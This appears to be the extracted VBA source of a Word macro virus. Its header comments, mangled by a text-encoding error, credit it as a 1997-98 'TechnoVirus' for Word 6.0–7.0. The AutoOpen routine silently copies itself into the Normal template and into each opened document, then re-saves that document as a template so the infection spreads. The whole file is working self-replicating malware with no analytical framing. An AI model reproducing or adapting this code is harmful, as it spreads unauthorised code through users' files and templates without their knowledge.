   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
                   ' ÒåñhnoVèðós(tm) fîr MiñrîSîft Wîrd 6.Î-7.Î '
                   ' (ñ) 1997-98 ÒåchnîSîft frîm Òîmsk          '
       CheckInWindow
       CheckNormal

   End Sub

   Private Function vpInNormal()
   Dim i

       vpInNormal = 0

       For i = 1 To WordBasic.CountMacros(0)
           If WordBasic.[MacroName$](i, 0) = "AutoOpen" Then vpInNormal = -1
       Next

   End Function

   Private Sub CheckNormal()

       If Not vpInNormal Then WordBasic.MacroCopy WordBasic.[MacroFileName$]("AutoOpen") + ":AutoOpen", "Normal:AutoOpen"

   End Sub

   Private Function vpInWindow()
   Dim i

       vpInWindow = 0

       For i = 1 To WordBasic.CountMacros(1)
           If WordBasic.[MacroName$](i, 1) = "AutoOpen" Then vpInWindow = -1
       Next

   End Function

   Private Sub CheckInWindow()

       If Not vpInWindow Then WordBasic.FileSaveAs Name:=WordBasic.[FileNameFromWindow$](), Format:=1: WordBasic.MacroCopy WordBasic.[MacroFileName$]("AutoOpen") + ":AutoOpen", WordBasic.[FileNameFromWindow$]() + ":AutoOpen": WordBasic.FileSaveAs Name:=WordBasic.[FileNameFromWindow$](), Format:=1

   End Sub

   '   ÌàñrîÒåñhnî ?!
